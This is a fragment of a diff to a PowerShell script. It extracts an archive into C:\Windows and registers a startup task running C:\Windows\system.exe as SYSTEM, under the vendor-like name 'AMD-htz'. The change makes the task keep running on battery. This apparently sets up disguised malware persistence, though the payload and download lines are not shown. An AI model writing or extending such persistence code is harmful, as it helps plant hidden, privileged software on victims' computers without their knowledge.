@@ -13,4 +13,5 @@ Expand-Archive -Path $outputPath -DestinationPath "C:\Windows"
 $action = New-ScheduledTaskAction -Execute "C:\Windows\system.exe"
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
-Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "AMD-htz" -Force
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -TaskName "AMD-htz" -Force
